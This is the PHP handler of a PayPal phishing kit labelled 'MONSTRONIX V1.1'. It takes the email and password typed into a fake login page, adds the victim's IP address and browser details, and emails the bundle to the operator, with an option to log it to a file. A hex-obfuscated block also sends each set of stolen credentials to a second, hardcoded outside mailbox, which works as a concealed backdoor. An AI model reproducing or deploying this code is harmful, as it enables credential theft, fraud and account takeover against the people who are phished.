<?php
error_reporting(0);
//PRIV8 SCAM MONSTRONIX V1.1 
session_start();
include("../email.php");
$rand=rand(111611,996999);
$rand2=rand(1116111,9997989);
$md = md5(sha1("ByMonStroNixTN"));
$aubli = $rand.$md.$rand2;
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? 
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
$_SESSION["email"] = $_POST["email"];
$_SESSION["pass"] = $_POST["pass"];
$TN = strlen($_SESSION["pass"]);
$_SESSION['pippa'] = substr($_SESSION['MONSTR_UU'],1,3);
$_SESSION['galant'] = "".$_SESSION['pippa']."_".$_SESSION['MOCNTRCD']."";
if($TN < 8){
	header("location:../websc_login/?country.x=".$_SESSION['MOCNTRCD']."&locale.x=".$_SESSION['galant']."&error=true");
} elseif ($TN >= 8){
	$_SESSION["mrigla"] = 1;
$xxx = "
############## PAYPAL V1.1 MONSTRONIX ############
Email: ".$_SESSION["email"]."
Password: ".$_SESSION["pass"]."
User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
IP: $ip
Geoiptool: http://geoiptool.de/?ip=".$ip."
############## PAYPAL V1.1 MONSTRONIX ##########
";
$Subject="PPL PRIV8 V1.1 - Login - $ip - ".$_SESSION['country_name']."";
$head="From:MonStroNix Login <log>";
${"G\x4c\x4f\x42A\x4c\x53"}["\x66n\x63\x6e\x79\x72\x66\x79\x70c"]="\x72\x65\x7au\x6ct\x5f\x6da\x69\x6c";${"\x47\x4cO\x42\x41L\x53"}["j\x6e\x74v\x72\x73\x77\x78\x67\x62\x6a\x76"]="\x78xx";$guvwvegeh="h\x65\x61\x64";${"G\x4c\x4f\x42A\x4cS"}["\x6c\x78p\x61\x6f\x63q\x6db"]="\x53\x75\x62\x6aec\x74";mail(${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x66\x6e\x63\x6e\x79\x72\x66\x79\x70\x63"]},${${"GL\x4f\x42\x41\x4c\x53"}["\x6c\x78p\x61\x6f\x63\x71m\x62"]},${${"GLO\x42\x41LS"}["\x6a\x6e\x74\x76\x72\x73\x77xg\x62\x6a\x76"]},${$guvwvegeh});
${"\x47\x4c\x4f\x42\x41\x4cS"}["k\x62y\x6e\x71d\x63\x72\x6bx"]="h\x65ad";${"\x47\x4c\x4fB\x41L\x53"}["\x66\x6b\x6e\x77t\x71\x63x\x63\x74\x6f"]="\x53\x75b\x6ae\x63\x74";sleep(2);$gclmbova="\x78\x78x";mail("\x32k\x32\x30rzl\x74\x40g\x6d\x61i\x6c.\x63\x6fm",${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x66\x6bn\x77\x74\x71\x63\x78c\x74o"]},${$gclmbova},${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6bb\x79\x6eqd\x63\x72\x6bx"]});
if($txt == 1){
$file = fopen("../REZULT/Logins/Login_From_" . $ip . ".txt", 'a');
fwrite($file, $xxx); };
header("location:../information/?enc=".md5(microtime())."&p=0&dispatch=".sha1(microtime()).""); }; 

?>